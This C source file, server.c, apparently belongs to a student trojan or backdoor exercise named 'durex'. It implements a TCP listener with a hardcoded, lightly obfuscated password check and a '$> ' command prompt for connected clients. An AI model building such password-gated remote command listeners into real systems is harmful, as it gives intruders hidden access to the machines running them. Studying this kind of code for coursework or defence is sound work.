/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   server.c                                           :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: root </var/mail/root>                      +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2018/07/15 03:19:03 by root              #+#    #+#             */
/*   Updated: 2018/07/29 10:42:38 by root             ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

/* getaddrinfo socket */
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>

#include "ft_dprintf.h"
#include "main.h"
#include "durex.h"

static int			openSocket(struct addrinfo *p)
{
	int				fd;
	int				on;

	on = 1;
	fd = socket(p->ai_family, p->ai_socktype, p->ai_protocol);
	if (fd < 0)
		return -1;
	if (!setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &on, sizeof(on)) &&
		!bind(fd, p->ai_addr, p->ai_addrlen) &&
		!listen(fd, SERVER_CLIENT_MAX))
		return fd;
	close(fd);
	return -1;
}

int					openServer(const char *addr, const char *port)
{
	int				fd;
	struct addrinfo	hints;
	struct addrinfo	*res;
	struct addrinfo	*p;

	fd = -1;
	memset(&hints, 0, sizeof(hints));
	hints.ai_flags = AI_PASSIVE | AI_CANONNAME;
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;
	if (getaddrinfo(addr, port, &hints, &res))
		return (-1);
	p = res;
	while (p != NULL)
	{
		if (p->ai_family == AF_INET)
			fd = openSocket(p);
		if (fd >= 0)
			break ;
		p = p->ai_next;
	}
	freeaddrinfo(res);
	if (p == NULL || fd < 0)
		return (-1);
	return fd;
}

void					serverAcceptConnections()
{
	struct sockaddr		csin;
	socklen_t			len= sizeof(csin);
	int					fd;

	fd = accept(e.server.fd, &csin, &len);
	if (fd < 0)
		return ;
	for (int i = 0; i < SERVER_CLIENT_MAX; i++) {
		if (e.server.client[i].fd == -1) {
			e.server.client[i].fd = fd;
			clientWrite("Pass: ", &e.server.client[i]);
			return ;
		}
	}
	write(fd, "Server Full\n", 13);
	close(fd);
}

static int			ustrcmp(u_char *s1, u_char *s2)
{
	size_t			i;

	i = 0;
	while (s1[i] && s2[i] && s1[i] == s2[i])
		i++;
	return (s1[i] - s2[i]);
}

static void			serverLogging(u_char *buff, int size, t_cl *client)
{
	memset(buff + size, 0, SERVER_CLIENT_BUFF - size);
	encrypt(buff, size);
	//kata (4): 201 121 30 74
	//KATA (4): 44 92 192 65
	//KatA (4): 116 103 224 84
	if (ustrcmp(buff, (u_char []){ 201, 121, 30, 74, 0 }) == 3) {
		client->logged = 1;
		clientWrite("$> ", client);
	} else {
		clientWrite("Pass: ", client);
	}
}

static void			serverCommands(char *buff, t_cl *client)
{
	static t_cmd	cmds[] = { SERVER_COMMANDS };
	size_t			i;

	for (i = 0; i < sizeof(cmds) / sizeof(*cmds); i++) {
		if (!strcmp(cmds[i].name, buff)) {
			cmds[i].func(client, cmds);
			break ;
		}
	}
	if (i != 1)
		clientWrite("$> ", client);
}

void				serverReadClient(t_cl *client)
{
	char			buff[SERVER_CLIENT_BUFF];
	int				ret;

	ret = read(client->fd, buff, SERVER_CLIENT_BUFF);
	if (ret <= 0)
		return serverQuitClient(client, NULL);
	clientRead(buff, ret, client);
	/* Here we recreate the client rd buff to get a non truncated string */
	char *ptr = client->rd.tail;
	ret = 0;
	while (ptr != client->rd.head) {
		buff[ret++] = *ptr;
		if (*ptr == '\n') {
			buff[ret - 1] = '\0';
			if (!client->logged)
				serverLogging((u_char *)buff, ret - 1, client);
			else
				serverCommands(buff, client);
			ret = 0;
			client->rd.tail = moveTail(ptr, client->rd.buff, SERVER_CLIENT_BUFF);
		}
		ptr = moveTail(ptr, client->rd.buff, SERVER_CLIENT_BUFF);
	}
}

void				serverWriteClient(t_cl *client)
{
	int				ret;

	if (client->wr.head != client->wr.tail) {
		if (client->wr.head > client->wr.tail) {
			ret = write(client->fd, client->wr.tail, client->wr.head - client->wr.tail);
			client->wr.tail = client->wr.head;
		} else {
			ret = write(client->fd, client->wr.tail, client->wr.buff + SERVER_CLIENT_BUFF - (client->wr.tail));
			client->wr.tail = client->wr.buff;
		}
		if (ret <= 0)
			return serverQuitClient(client, NULL);
	}
}

void				quitClearlyServer()
{
	for (int i = 0; i < SERVER_CLIENT_MAX; i++)
	{
		if (e.server.client[i].fd != -1)
			close(e.server.client[i].fd);
		clearClient(&e.server.client[i]);
	}
	if (e.server.fd != -1)
		close(e.server.fd);
	if (e.server.reporter != -1)
		close(e.server.reporter);
}
